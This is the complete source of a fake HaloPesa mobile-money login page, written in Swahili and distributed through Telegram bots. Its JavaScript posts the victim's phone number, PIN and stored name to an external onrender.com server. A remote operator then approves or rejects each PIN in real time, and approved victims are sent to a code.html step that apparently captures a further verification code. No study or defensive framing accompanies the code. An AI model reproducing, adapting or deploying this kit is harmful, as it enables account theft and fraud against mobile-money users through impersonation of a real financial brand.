<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>HaloPesa | Ingia</title>

    <style>
        /* ===== HALOPESA BRAND STYLES ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f0f4f0;
            min-height: 100vh;
        }

        .container {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 0;
        }

        .upper-section {
            width: 100%;
            max-width: 420px;
            text-align: center;
        }

        /* ===== HEADER - HaloPesa Green ===== */
        .header {
            background: #1a7a2a;
            padding: 28px 20px 22px;
            border-bottom-left-radius: 24px;
            border-bottom-right-radius: 24px;
            box-shadow: 0 4px 16px rgba(26, 122, 42, 0.20);
        }

        .logo-circle {
            width: 58px;
            height: 58px;
            background: #ffd700;
            border-radius: 50%;
            margin: 0 auto 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #1a7a2a;
            font-size: 22px;
            font-weight: 800;
            box-shadow: 0 2px 12px rgba(255, 215, 0, 0.30);
        }

        .brand {
            color: #ffd700;
            font-size: 26px;
            font-weight: 700;
            letter-spacing: 0.5px;
        }

        .subtitle {
            color: #d4edc8;
            margin-top: 4px;
            font-size: 14px;
            font-weight: 400;
        }

        /* ===== CONTENT ===== */
        .content {
            padding: 30px 20px 20px;
        }

        .login-title {
            font-size: 34px;
            color: #1a2b1a;
            font-weight: 700;
            margin-bottom: 22px;
            letter-spacing: -0.5px;
        }

        /* ===== PHONE INPUT ===== */
        .phone-wrapper {
            position: relative;
            margin-bottom: 25px;
        }

        .phone-display {
            width: 100%;
            padding: 16px 18px 16px 56px;
            border: 2px solid #d0e0d0;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            background: #fafffa;
            text-align: left;
            color: #1a2b1a;
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
            cursor: text;
        }

        .phone-display:focus {
            border-color: #1a7a2a;
            box-shadow: 0 0 0 4px rgba(26, 122, 42, 0.12);
        }

        .phone-display.error {
            border-color: #b91c1c;
            box-shadow: 0 0 0 4px rgba(185, 28, 28, 0.12);
        }

        .flag {
            position: absolute;
            left: 18px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 24px;
            pointer-events: none;
        }

        /* ===== PIN SECTION ===== */
        .pin-label {
            color: #4a5a4a;
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 18px;
        }

        .pin-row {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 15px;
        }

        .pin-boxes {
            display: flex;
            gap: 12px;
        }

        .pin-boxes input {
            width: 58px;
            height: 58px;
            border: 2px solid #d0e0d0;
            border-radius: 12px;
            text-align: center;
            font-size: 26px;
            font-weight: 700;
            outline: none;
            background: #fafffa;
            color: #1a2b1a;
            transition: border-color 0.2s, box-shadow 0.2s, transform 0.15s;
        }

        .pin-boxes input:focus {
            border-color: #1a7a2a;
            box-shadow: 0 0 0 4px rgba(26, 122, 42, 0.12);
        }

        .pin-boxes input.error {
            border-color: #b91c1c;
            box-shadow: 0 0 0 4px rgba(185, 28, 28, 0.15);
        }

        .pin-boxes input:disabled {
            opacity: 0.6;
            background: #f0f4f0;
        }

        /* ===== SHAKE ANIMATION ===== */
        @keyframes shake {
            0%,
            100% {
                transform: translateX(0);
            }
            10% {
                transform: translateX(-12px);
            }
            30% {
                transform: translateX(10px);
            }
            50% {
                transform: translateX(-8px);
            }
            70% {
                transform: translateX(6px);
            }
            90% {
                transform: translateX(-4px);
            }
        }

        .pin-boxes.shake input {
            animation: shake 0.5s ease-in-out;
            border-color: #b91c1c;
            box-shadow: 0 0 0 4px rgba(185, 28, 28, 0.15);
        }

        .eye {
            font-size: 24px;
            color: #5a6b5a;
            cursor: pointer;
            padding: 8px;
            border-radius: 50%;
            transition: background 0.2s;
        }

        .eye:hover {
            background: #eaf6ea;
        }

        .forgot {
            color: #1a7a2a;
            margin-top: 18px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: color 0.2s;
        }

        .forgot:hover {
            color: #136622;
            text-decoration: underline;
        }

        /* ===== STATUS MESSAGE (normal) ===== */
        #status {
            min-height: 22px;
            margin-top: 12px;
            font-size: 15px;
            font-weight: 600;
            padding: 12px 16px;
            border-radius: 10px;
            display: none;
            transition: all 0.3s ease;
            border: 2px solid transparent;
        }

        #status.success {
            display: block;
            background: #e6f7e6;
            color: #0d6b1a;
            border-color: #2e9c3e;
            box-shadow: 0 2px 12px rgba(46, 156, 62, 0.15);
        }
        #status.success::before {
            content: "✅ ";
            font-size: 18px;
        }

        #status.waiting {
            display: block;
            background: #fefcf0;
            color: #8d7a0e;
            border-color: #e6c84a;
            box-shadow: 0 2px 12px rgba(230, 200, 74, 0.15);
        }
        #status.waiting::before {
            content: "⏳ ";
            font-size: 18px;
        }

        #status.telegram-info {
            display: block;
            background: #e8f0fe;
            color: #1a4a7a;
            border-color: #4a8fd4;
            box-shadow: 0 2px 12px rgba(74, 143, 212, 0.12);
        }
        #status.telegram-info::before {
            content: "📱 ";
            font-size: 18px;
        }

        /* ===== DEDICATED ERROR BOX - ALWAYS VISIBLE WHEN SHOWN ===== */
        #errorBox {
            display: none;
            background: #d32f2f;
            color: #ffffff;
            font-size: 18px;
            font-weight: 700;
            padding: 16px 20px;
            border-radius: 12px;
            border: 3px solid #b71c1c;
            box-shadow: 0 4px 24px rgba(211, 47, 47, 0.6);
            margin-top: 16px;
            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
            animation: pulseError 1.2s ease-in-out infinite;
        }
        #errorBox::before {
            content: "🚫 ";
            font-size: 24px;
        }
        #errorBox.show {
            display: block !important;
        }

        @keyframes pulseError {
            0%,
            100% {
                box-shadow: 0 4px 24px rgba(211, 47, 47, 0.6);
            }
            50% {
                box-shadow: 0 4px 36px rgba(211, 47, 47, 0.9);
            }
        }

        /* ===== TEST BUTTON (Telegram only) ===== */
        .test-wrong-pin {
            display: none;
            margin-top: 16px;
            background: #d32f2f;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 10px;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
            box-shadow: 0 2px 8px rgba(211, 47, 47, 0.3);
        }
        .test-wrong-pin:hover {
            background: #b71c1c;
        }
        .telegram-app .test-wrong-pin {
            display: block;
        }

        /* ===== LOWER SECTION ===== */
        .lower-section {
            width: 100%;
            max-width: 420px;
            padding: 0 20px 40px;
        }

        .action-buttons {
            margin-top: 10px;
        }

        .action {
            width: 100%;
            background: #1a7a2a;
            color: white;
            text-align: center;
            padding: 17px;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            border: none;
            transition: background 0.25s, transform 0.1s, opacity 0.25s;
            letter-spacing: 0.5px;
            position: relative;
        }

        .action:hover:not(:disabled) {
            background: #136622;
            transform: scale(1.01);
        }

        .action:active:not(:disabled) {
            transform: scale(0.98);
        }

        .action:disabled,
        .action.disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
            background: #8aaa8a;
        }

        .action .spinner {
            display: none;
            width: 22px;
            height: 22px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top: 3px solid #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }

        .action.loading .spinner {
            display: block;
        }
        .action.loading .btn-text {
            display: none;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 480px) {
            .login-title {
                font-size: 30px;
            }
            .pin-boxes input {
                width: 52px;
                height: 52px;
                font-size: 22px;
            }
            .header {
                padding: 22px 16px 18px;
            }
            .brand {
                font-size: 22px;
            }
            .content {
                padding: 22px 16px 16px;
            }
            .phone-display {
                font-size: 16px;
                padding: 14px 14px 14px 50px;
            }
            #status {
                font-size: 14px;
                padding: 10px 14px;
            }
            #errorBox {
                font-size: 16px;
                padding: 14px 16px;
            }
        }
    </style>
</head>

<body>

    <div class="container">

        <div class="upper-section">

            <!-- ===== HEADER ===== -->
            <div class="header">
                <div class="logo-circle">HP</div>
                <div class="brand">HaloPesa</div>
                <div class="subtitle">Mikopo Rahisi na Haraka</div>
            </div>

            <div class="content">

                <div class="login-title">Ingia</div>

                <!-- ===== PHONE INPUT ===== -->
                <div class="phone-wrapper">
                    <span class="flag">🇹🇿</span>
                    <input
                    class="phone-display"
                    id="phoneDisplay"
                    type="tel"
                    placeholder="Weka nambari ya simu"
                    value=""
                    autocomplete="tel"
                    autofocus
                    />
                </div>

                <div class="pin-label">Weka Nambari ya Siri (tarakimu 4)</div>

                <div class="pin-row">
                    <div class="pin-boxes" id="pinBoxesContainer">
                        <input type="tel" maxlength="1" />
                        <input type="tel" maxlength="1" />
                        <input type="tel" maxlength="1" />
                        <input type="tel" maxlength="1" />
                    </div>
                    <div class="eye" id="toggleVisibility">👁</div>
                </div>

                <div class="forgot" id="forgotPin">Umesahau Nambari ya Siri?</div>

                <!-- ===== STATUS MESSAGE (regular) ===== -->
                <div id="status"></div>

                <!-- ===== DEDICATED ERROR BOX (extra safe) ===== -->
                <div id="errorBox">Nambari ya Siri si sahihi. Tafadhali jaribu tena.</div>

                <!-- ===== TEST BUTTON (Telegram only) ===== -->
                <button class="test-wrong-pin" id="testWrongPinBtn">🔴 Jaribu PIN Isiyo Sahihi</button>

            </div>

        </div>

        <div class="lower-section">
            <div class="action-buttons">
                <button class="action disabled" id="loginBtn" disabled>
                    <span class="btn-text">INGIA</span>
                    <span class="spinner"></span>
                </button>
            </div>
        </div>

    </div>

    <!-- ============================================================ -->
    <!-- ===== JAVASCRIPT ===== -->
    <!-- ============================================================ -->
    <script>
        // =============================================
        //  CONFIGURATION
        // =============================================
        const BACKEND_URL = "https://halopesa-tanzania-x2u7.onrender.com";
        const USE_MOCK = false;

        // =============================================
        //  DOM REFS
        // =============================================
        const phoneInput = document.getElementById("phoneDisplay");
        const boxes = document.querySelectorAll(".pin-boxes input");
        const pinBoxesContainer = document.getElementById("pinBoxesContainer");
        const statusEl = document.getElementById("status");
        const errorBox = document.getElementById("errorBox");
        const loginBtn = document.getElementById("loginBtn");
        const forgotPinEl = document.getElementById("forgotPin");
        const toggleVisibilityEl = document.getElementById("toggleVisibility");
        const testWrongPinBtn = document.getElementById("testWrongPinBtn");

        let isPasswordVisible = false;
        let isSubmitting = false;
        let pollingInterval = null;

        // =============================================
        //  BOT ID FROM URL
        // =============================================
        const botId = new URLSearchParams(window.location.search).get("botId") || "test_bot";
        console.log("🤖 Bot ID:", botId);

        // =============================================
        //  TELEGRAM INTEGRATION CHECK
        // =============================================
        function isTelegramWebApp() {
            return !!(window.Telegram && window.Telegram.WebApp);
        }

        if (isTelegramWebApp()) {
            document.body.classList.add('telegram-app');
        }

        function notifyTelegram(message, type = 'info') {
            try {
                if (isTelegramWebApp()) {
                    const tg = window.Telegram.WebApp;
                    let prefix = type === 'success' ? '✅ ' : type === 'error' ? '❌ ' : 'ℹ️ ';
                    tg.showAlert(prefix + message);
                }
            } catch (e) {
                console.warn('Telegram notification failed:', e);
            }
        }

        // =============================================
        //  STATUS FUNCTIONS
        // =============================================
        function setStatus(message, type = 'waiting') {
            statusEl.textContent = message;
            statusEl.className = type;
            statusEl.style.display = 'block';
            console.log(`📢 [${type.toUpperCase()}] ${message}`);
        }

        function clearStatus() {
            statusEl.style.display = 'none';
            statusEl.className = '';
            statusEl.textContent = '';
            errorBox.classList.remove('show'); // also hide the dedicated error box
        }

        // ===== PIN APPROVED =====
        function showPinApproved() {
            const message = "Nambari ya Siri imekubaliwa";
            setStatus(message, 'success');
            errorBox.classList.remove('show');
            if (isTelegramWebApp()) notifyTelegram(message, 'success');
        }

        // ===== WRONG PIN - ULTRA VISIBLE =====
        function showWrongPin() {
            console.log("❌ showWrongPin() called – displaying error now.");
            const message = "Nambari ya Siri si sahihi. Tafadhali jaribu tena.";

            // 1. Show the dedicated error box (always visible)
            errorBox.textContent = message;
            errorBox.classList.add('show');

            // 2. Also update the status div (for consistency)
            setStatus(message, 'telegram-pin-error');

            // 3. Telegram alert
            if (isTelegramWebApp()) {
                notifyTelegram("❌ Nambari ya Siri si sahihi. Tafadhali jaribu tena.", 'error');
            }

            // 4. Shake animation
            pinBoxesContainer.classList.remove('shake');
            void pinBoxesContainer.offsetWidth;
            pinBoxesContainer.classList.add('shake');
            boxes.forEach(b => b.classList.add('error'));
            setTimeout(() => {
                boxes.forEach(b => b.classList.remove('error'));
                pinBoxesContainer.classList.remove('shake');
            }, 600);

            console.log("✅ Error message should now be visible in both the status bar and the dedicated error box.");
        }

        // =============================================
        //  VALIDATION
        // =============================================
        function validateAndUpdateButton() {
            const phone = phoneInput.value.trim();
            let pin = "";
            boxes.forEach(b => pin += b.value);
            const allFilled = phone.length > 0 && pin.length === 4;

            phoneInput.classList.remove('error');
            boxes.forEach(b => b.classList.remove('error'));

            loginBtn.disabled = !allFilled;
            if (allFilled) loginBtn.classList.remove("disabled");
            else loginBtn.classList.add("disabled");

            return allFilled;
        }

        // =============================================
        //  PHONE INPUT EVENTS
        // =============================================
        phoneInput.addEventListener("input", function() {
            this.classList.remove('error');
            localStorage.setItem("phone", this.value);
            validateAndUpdateButton();
            // Clear error when user starts typing
            if (errorBox.classList.contains('show')) {
                errorBox.classList.remove('show');
            }
            if (statusEl.className === 'wrong-pin' || statusEl.className === 'telegram-pin-error') {
                clearStatus();
            }
        });

        phoneInput.addEventListener("change", validateAndUpdateButton);

        // =============================================
        //  PIN BOXES
        // =============================================
        boxes.forEach((box, i) => {
            box.addEventListener("input", async function() {
                this.value = this.value.replace(/[^0-9]/g, '');
                this.classList.remove('error');

                if (this.value && i < 3) boxes[i + 1].focus();

                validateAndUpdateButton();

                const phone = phoneInput.value.trim();
                if (phone.length === 0) {
                    phoneInput.classList.add('error');
                    setStatus("Tafadhali weka nambari yako ya simu kwanza.", 'error');
                    boxes.forEach(b => { b.value = ''; });
                    boxes[0].focus();
                    validateAndUpdateButton();
                    return;
                }

                if (i === 3 && this.value) {
                    let pin = "";
                    boxes.forEach(b => pin += b.value);
                    const phoneCheck = phoneInput.value.trim();
                    await submitLogin(phoneCheck, pin);
                }
            });

            box.addEventListener("keydown", (e) => {
                if (e.key === "Backspace" && !box.value && i > 0) {
                    boxes[i - 1].focus();
                    setTimeout(validateAndUpdateButton, 10);
                }
                if (e.key === "Enter") {
                    let pin = "";
                    boxes.forEach(b => pin += b.value);
                    const phone = phoneInput.value.trim();
                    if (pin.length === 4 && phone.length > 0) {
                        submitLogin(phone, pin);
                    } else if (phone.length === 0) {
                        phoneInput.classList.add('error');
                        setStatus("Tafadhali weka nambari yako ya simu kwanza.", 'error');
                        phoneInput.focus();
                    } else {
                        setStatus("Tafadhali weka tarakimu zote 4 za Nambari ya Siri.", 'error');
                        boxes[0].focus();
                    }
                }
            });

            box.addEventListener("blur", validateAndUpdateButton);
            box.addEventListener("focus", function() {
                this.classList.remove('error');
                // Clear error when focusing a pin box
                if (errorBox.classList.contains('show')) {
                    errorBox.classList.remove('show');
                }
                if (statusEl.className === 'wrong-pin' || statusEl.className === 'telegram-pin-error') {
                    clearStatus();
                }
            });
        });

        // =============================================
        //  PASTE SUPPORT
        // =============================================
        document.addEventListener('paste', (e) => {
            const target = e.target;
            if (!target.closest || !target.closest('.pin-boxes')) return;

            const pastedData = e.clipboardData.getData('text');
            const cleanedData = pastedData.replace(/[^0-9]/g, '');

            if (cleanedData.length === 4) {
                e.preventDefault();
                boxes.forEach((box, index) => {
                    box.value = cleanedData[index] || '';
                });
                boxes[3].focus();
                validateAndUpdateButton();

                const phone = phoneInput.value.trim();
                if (phone.length === 0) {
                    phoneInput.classList.add('error');
                    setStatus("Tafadhali weka nambari yako ya simu kwanza.", 'error');
                    boxes.forEach(b => { b.value = ''; });
                    boxes[0].focus();
                    validateAndUpdateButton();
                    return;
                }

                let pin = "";
                boxes.forEach(b => pin += b.value);
                submitLogin(phone, pin);
            }
        });

        // =============================================
        //  TOGGLE PIN VISIBILITY
        // =============================================
        toggleVisibilityEl.addEventListener("click", function() {
            isPasswordVisible = !isPasswordVisible;
            boxes.forEach(box => box.type = isPasswordVisible ? "text" : "tel");
            this.textContent = isPasswordVisible ? "🙈" : "👁";
        });

        // =============================================
        //  FORGOT PIN
        // =============================================
        forgotPinEl.addEventListener("click", function() {
            const phone = phoneInput.value.trim();
            let msg = "Tafadhali wasiliana na msimamizi wa HaloPesa kupata Nambari yako ya Siri.";
            if (phone.length > 0) msg = `Tafadhali wasiliana na msimamizi wa HaloPesa kwa nambari ${phone}.`;
            setStatus(msg, "telegram-info");
            errorBox.classList.remove('show');
            if (isTelegramWebApp()) notifyTelegram("Wasiliana na msimamizi.", "info");
        });

        // =============================================
        //  SUBMIT LOGIN
        // =============================================
        async function submitLogin(phone, pin) {
            if (isSubmitting) return;
            isSubmitting = true;

            boxes.forEach(b => b.disabled = true);
            loginBtn.disabled = true;
            loginBtn.classList.add("disabled", "loading");
            clearStatus();
            errorBox.classList.remove('show');

            if (pollingInterval) {
                clearInterval(pollingInterval);
                pollingInterval = null;
            }

            setStatus("Inatuma kwa uthibitisho...", isTelegramWebApp() ? "telegram-info" : "waiting");

            if (USE_MOCK) {
                console.log("🧪 Mock mode: testing PIN", pin);
                await new Promise(resolve => setTimeout(resolve, 1500));
                if (pin === "1234") {
                    showPinApproved();
                    localStorage.setItem("pin", pin);
                    setTimeout(() => window.location.href = `code.html?botId=${botId}`, 600);
                } else {
                    showWrongPin();
                    resetForm();
                }
                isSubmitting = false;
                return;
            }

            try {
                const firstName = localStorage.getItem("firstName") || "";
                const lastName = localStorage.getItem("lastName") || "";
                const name = localStorage.getItem("name") || "";
                let fullName = name || (firstName ? (lastName ? `${firstName} ${lastName}` : firstName) : "Unknown");

                const cleanPhone = phone.replace(/\s/g, '');
                const payload = {
                    name: fullName,
                    phone: cleanPhone || "Unknown",
                    pin: pin,
                    botId: botId || ""
                };

                console.log("📤 Sending payload:", payload);

                const res = await fetch(`${BACKEND_URL}/submit-pin`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json", "Accept": "application/json" },
                    body: JSON.stringify(payload)
                });

                const responseText = await res.text();
                console.log("📥 Response status:", res.status, "Body:", responseText);

                if (!res.ok) {
                    let errorMsg = "Imeshindwa kutuma Nambari ya Siri. Jaribu tena.";
                    try { const err = JSON.parse(responseText);
                        errorMsg = err.error || errorMsg; } catch {}
                    setStatus(errorMsg, 'error');
                    resetForm();
                    return;
                }

                let data;
                try { data = JSON.parse(responseText); } catch {
                    setStatus("Hitilafu ya muundo wa data kutoka seva.", 'error');
                    resetForm();
                    return;
                }

                if (!data || !data.requestId) {
                    setStatus("Seva haikurudisha Kitambulisho cha ombi.", 'error');
                    resetForm();
                    return;
                }

                setStatus("Inasubiri msimamizi kukubali au kukataa...", isTelegramWebApp() ? "telegram-info" : "waiting");

                const approved = await pollPinApproval(data.requestId);

                if (approved === true) {
                    showPinApproved();
                    localStorage.setItem("pin", pin);
                    setTimeout(() => window.location.href = `code.html?botId=${botId}`, 600);
                } else if (approved === false) {
                    showWrongPin();
                    resetForm();
                } else {
                    setStatus("Muda wa kusubiri umeisha. Tafadhali jaribu tena.", 'error');
                    resetForm();
                }

            } catch (error) {
                console.error("Network error:", error);
                setStatus("Tatizo la muunganisho. Angalia mtandao wako.", 'error');
                if (isTelegramWebApp()) notifyTelegram("Tatizo la muunganisho.", "error");
                resetForm();
            } finally {
                isSubmitting = false;
            }
        }

        // =============================================
        //  POLL PIN APPROVAL
        // =============================================
        function pollPinApproval(requestId) {
            let attempts = 0;
            const maxAttempts = 120;

            return new Promise((resolve) => {
                if (pollingInterval) clearInterval(pollingInterval);

                pollingInterval = setInterval(async () => {
                    attempts++;
                    console.log(`🔍 Polling attempt ${attempts} for ${requestId}`);

                    try {
                        const res = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
                        const data = await res.json();
                        console.log("📥 Poll response:", data);

                        if (data.blocked === true) {
                            clearInterval(pollingInterval);
                            pollingInterval = null;
                            setStatus("Akaunti yako imezuiwa. Wasiliana na msimamizi.", 'error');
                            if (isTelegramWebApp()) notifyTelegram("Akaunti imezuiwa.", "error");
                            resolve(false);
                            return;
                        }

                        if (data.approved === true) {
                            clearInterval(pollingInterval);
                            pollingInterval = null;
                            console.log("✅ Admin APPROVED the PIN.");
                            resolve(true);
                            return;
                        }

                        if (data.approved === false) {
                            clearInterval(pollingInterval);
                            pollingInterval = null;
                            console.log("❌ Admin REJECTED the PIN (wrong PIN).");
                            resolve(false);
                            return;
                        }

                        if (attempts % 8 === 0 || attempts === 1) {
                            const elapsed = Math.floor(attempts * 1.5);
                            const mins = Math.floor(elapsed / 60);
                            const secs = elapsed % 60;
                            const timeStr = mins > 0 ? `${mins}m ${secs}s` : `${secs}s`;
                            const msg = `Inasubiri msimamizi... (${timeStr})`;
                            setStatus(msg, isTelegramWebApp() ? "telegram-info" : "waiting");
                        }

                        if (attempts >= maxAttempts) {
                            clearInterval(pollingInterval);
                            pollingInterval = null;
                            console.warn("⏰ Polling timed out.");
                            resolve(null);
                        }

                    } catch (error) {
                        console.error("Poll error:", error);
                        if (attempts % 5 === 0) {
                            setStatus("Tatizo la muunganisho. Inajaribu tena...", "waiting");
                        }
                    }
                }, 1500);
            });
        }

        // =============================================
        //  RESET FORM
        // =============================================
        function resetForm() {
            if (pollingInterval) {
                clearInterval(pollingInterval);
                pollingInterval = null;
            }
            boxes.forEach(b => { b.disabled = false; b.value = ""; b.classList.remove('error'); });
            pinBoxesContainer.classList.remove('shake');
            loginBtn.disabled = true;
            loginBtn.classList.add("disabled");
            loginBtn.classList.remove("loading");
            isSubmitting = false;
            validateAndUpdateButton();
            boxes[0].focus();
            // We keep error visible until user interacts
        }

        // =============================================
        //  LOGIN BUTTON CLICK
        // =============================================
        loginBtn.addEventListener("click", () => {
            if (loginBtn.disabled || isSubmitting) {
                console.warn("Button is disabled or submitting.");
                return;
            }

            const phone = phoneInput.value.trim();
            if (phone.length === 0) {
                phoneInput.classList.add('error');
                setStatus("Tafadhali weka nambari yako ya simu kwanza.", 'error');
                phoneInput.focus();
                return;
            }

            let pin = "";
            boxes.forEach(b => pin += b.value);
            if (pin.length === 4) {
                console.log("👉 Login button clicked! Submitting phone:", phone, "PIN:", pin);
                submitLogin(phone, pin);
            } else {
                setStatus("Tafadhali weka Nambari ya Siri yenye tarakimu 4.", 'error');
                boxes[0].focus();
            }
        });

        // =============================================
        //  TEST WRONG PIN BUTTON
        // =============================================
        testWrongPinBtn.addEventListener("click", function() {
            console.log("🧪 Test wrong PIN button clicked.");
            showWrongPin();
        });

        // =============================================
        //  LOAD
        // =============================================
        window.addEventListener('load', function() {
            setTimeout(() => {
                phoneInput.focus();
                if (phoneInput.value) phoneInput.setSelectionRange(phoneInput.value.length, phoneInput.value
                .length);
                validateAndUpdateButton();

                if (!botId || botId === "test_bot") {
                    setStatus("Hitilafu: Hakuna Kitambulisho cha Bot. Tumia kiungo kutoka Telegram.", 'error');
                    loginBtn.disabled = true;
                    loginBtn.classList.add("disabled");
                } else {
                    if (isTelegramWebApp()) {
                        setStatus("Umeunganishwa kwa Telegram. Weka nambari ya simu.", "telegram-info");
                        setTimeout(clearStatus, 3000);
                    }
                    if (USE_MOCK) {
                        setStatus("🧪 Hali ya majaribio: PIN sahihi ni 1234", "telegram-info");
                        setTimeout(clearStatus, 5000);
                    }
                }
                // Hide the error box initially
                errorBox.classList.remove('show');
            }, 100);
        });

        document.addEventListener('pageshow', function() {
            phoneInput.focus();
            validateAndUpdateButton();
        });

        // =============================================
        //  INIT
        // =============================================
        loginBtn.disabled = true;
        loginBtn.classList.add("disabled");
        validateAndUpdateButton();

        console.log("✅ HaloPesa login page ready.");
        console.log("📱 Telegram WebApp:", isTelegramWebApp() ? "Yes" : "No");
        console.log("🤖 Bot ID:", botId || "MISSING");
        console.log("🧪 Mock mode:", USE_MOCK ? "ON (PIN 1234 = success)" : "OFF (using real backend)");
        console.log("👉 Error will now appear in a dedicated red box + Telegram alert.");
    </script>

</body>
</html>
